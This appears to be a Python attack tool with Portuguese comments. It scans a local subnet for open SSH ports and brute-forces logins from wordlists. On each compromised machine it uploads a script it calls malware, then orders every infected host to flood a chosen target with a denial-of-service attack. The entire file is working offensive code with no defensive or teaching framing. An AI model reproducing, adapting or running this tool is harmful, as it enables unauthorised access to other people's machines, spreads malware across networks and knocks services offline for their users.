import paramiko
import socket
import time
import threading
import sys
import os
import subprocess
import queue
from concurrent.futures import ThreadPoolExecutor

# Configurações
ssh_port = 22
user_file = "user.txt"
pass_file = "password.txt"  
local_script_path = "./DoS.py" # Servidor onde o script DoS.py está hospedado
remote_script_path = "/tmp/DoS.py"  # Caminho onde o script será salvo no alvo

# Global Variables
infected_hosts = []
found_credentials = False
lock = threading.Lock()

sys.stderr = open(os.devnull, 'w')

# Função para verificar se a porta SSH está aberta
def is_port_open(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

def test_credentials(host, user, password, queue, max_retries=3):
    global found_credentials
    if found_credentials:
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    retries = 0
    while retries < max_retries:
        try:
            client.connect(hostname=host, username=user, password=password, timeout=2)
            
            with lock:
                if not found_credentials:  # Dupla verificação para evitar condições de corrida
                    found_credentials = True
                    print(f"[+] Credenciais encontradas para {host}: {user}:{password}")
                    queue.put(client)
            return  # Sai da função caso a conexão tenha sido bem-sucedida
        
        except paramiko.AuthenticationException:
            # Falha de autenticação: credenciais inválidas, sair da função
            break
        
        except paramiko.SSHException as e:
            # Em caso de erro de SSH, aumente o contador de tentativas e espere antes de tentar novamente
            #print(f"Erro de SSH ({retries + 1}/{max_retries}): {e}")
            retries += 1
            time.sleep(1)  # Espera um segundo antes de tentar novamente
        
        except Exception as e:
            # Outros erros, como problemas de rede
            print(f"[-] Erro geral ({retries + 1}/{max_retries}): {e}")
            retries += 1
            time.sleep(1)  # Espera um segundo antes de tentar novamente

    # Fecha o cliente caso todas as tentativas falhem
    client.close()

# Função para brute force SSH
def brute_force_ssh(host, userlist, passlist, max_threads):
    global found_credentials
    client_queue = queue.Queue()

    # Carrega os usuários e senhas das wordlists
    with open(userlist, 'r') as users:
        user_lines = users.readlines()
    with open(passlist, 'r') as passwords:
        pass_lines = passwords.readlines()

    print("[*] Iniciando SSH Brute Force...")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for user in user_lines:
            user = user.strip()
            for password in pass_lines:
                password = password.strip()
                if found_credentials:
                    break
                executor.submit(test_credentials, host, user, password, client_queue)
            if found_credentials:
                break

    if not client_queue.empty():
        return client_queue.get()
    else:
        print("[-] Nenhuma credencial válida foi encontrada.")
        return None

# Função para baixar e executar o script DoS no alvo
def deploy_dos_script(client):
    try:
        sftp = client.open_sftp()
        sftp.put(local_script_path, remote_script_path)  # Baixa o script DoS para o alvo
        sftp.close()
        # Torna o script executável
        client.exec_command(f"chmod +x {remote_script_path}")
        print(f"[+] Malware instalado com sucesso em {client.get_transport().getpeername()[0]}")
    except Exception as e:
        print(f"[-] Falha ao baixar o malware: {e}")

# Função para gerenciar o ataque DoS
def send_dos_command(client, target_ip, duration):
    try:
        command = f"python3 {remote_script_path} {target_ip} -d {duration}"
        client.exec_command(command)
        print(f"[+] Malware em execução em {client.get_transport().getpeername()[0]}")
    except Exception as e:
        print(f"[-] Erro ao enviar o comando DoS: {e}")

# Função principal para encontrar e infectar dispositivos
def infect_network(users,passwords):
    global found_credentials
    for i in range(102, 110):  # Varre IPs no intervalo de 192.168.0.1 - 192.168.0.254
        ip = f"192.168.0.{i}"
        if is_port_open(ip, ssh_port):
            print(f"[+] SSH habilitado em {ip}")
            found_credentials = False
            client = brute_force_ssh(ip, users, passwords, 10)
            if client:
                print(f"[*] Fazendo upload do malware")
                deploy_dos_script(client)
                infected_hosts.append(client)  # Adiciona cliente à lista de hosts infectados

# Função para iniciar o ataque DoS nos dispositivos infectados
def initiate_dos_attack(target_ip, duration):
    for client in infected_hosts:
        send_dos_command(client, target_ip, duration)
    time.sleep(duration)

# Execução do fluxo completo
if __name__ == "__main__":

    # Varre e infecta a rede
    print("[*] Iniciando varredura e infecção da rede...")
    infect_network(user_file, pass_file)
    
    # Inicia o ataque DoS nos dispositivos infectados
    target_ip = input("[x] Informe o alvo do ataque: ")  # IP do alvo para o ataque DoS
    duration = int(input("[x] Informe a duração do ataque: "))  # Duração do ataque em segundos
    print("[*] Iniciando ataque DoS...")
    initiate_dos_attack(target_ip, duration)
    print("[x] Ataque executado com sucesso")
    
    print("[*] Ataque DoS iniciado em todos os dispositivos infectados.")

